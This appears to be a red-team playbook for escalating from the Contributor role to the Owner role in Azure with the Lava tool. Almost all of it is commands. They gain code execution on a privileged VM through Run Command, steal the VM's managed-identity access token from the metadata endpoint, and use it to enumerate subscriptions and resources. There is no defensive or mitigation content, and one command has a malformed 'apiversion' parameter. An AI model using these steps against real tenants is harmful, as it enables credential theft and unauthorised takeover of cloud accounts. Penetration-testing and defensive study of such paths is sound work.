# Exploiting privileged VM resources

## Tools: Lava

## Requirements: Contributor account/role access

## Steps

 - python3 Lava.py (Run Lava)

 - Lava $> whoami (Confirm the authenticated user)

 - Lava $> ls (List all modules)

 - Lava $> exec vm_list_privileged (Execute this specific module to list privileged VMs)

 - Lava $> exec vm_rce -rgrp RESOURCE_GROUP -vm_name PRIVILEGED_VM (Exploit the Run Command functionality as a Contributor.)

 - curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com' -H Metadata:true (In the shell, obtain an access token for the resource manager that can be used to make API calls with the owner privileges)

 - Copy the "access_token" value, then press exit to return to the Lava console, then exit again.

### Use the token to run commands against the resource manager with the owner privilege.

 - TOKEN="ACCESS_TOKEN_FROM_PREVIOUS_STEP" (Store the access token as a variable)

 - curl --header "Authorization: Bearer ${TOKEN}" https://management.azure.com/subscriptions?api-version=2020-01-01 | jq (Get a list of subscriptions)

 - SUB_ID=$(curl --header "Authorization: Bearer ${TOKEN}" https://management.azure.com/subscriptions?apiversion=2020-01-01 | jq -r .value[].subscriptionId) (Store the subscriptions ID in a variable)

 - curl --header "Authorization: Bearer ${TOKEN}" https://management.azure.com/subscriptions/${SUB_ID}/resourcegroups?api-version=2019-10-01 | jq (Get a list of resource groups)

 - curl --header "Authorization: Bearer ${TOKEN}" https://management.azure.com/subscriptions/${SUB_ID}/resources?api-version=2019-10-01 | jq (Get a list of resources)

### Now we escalated from the Contributor role to the Owner role.


   

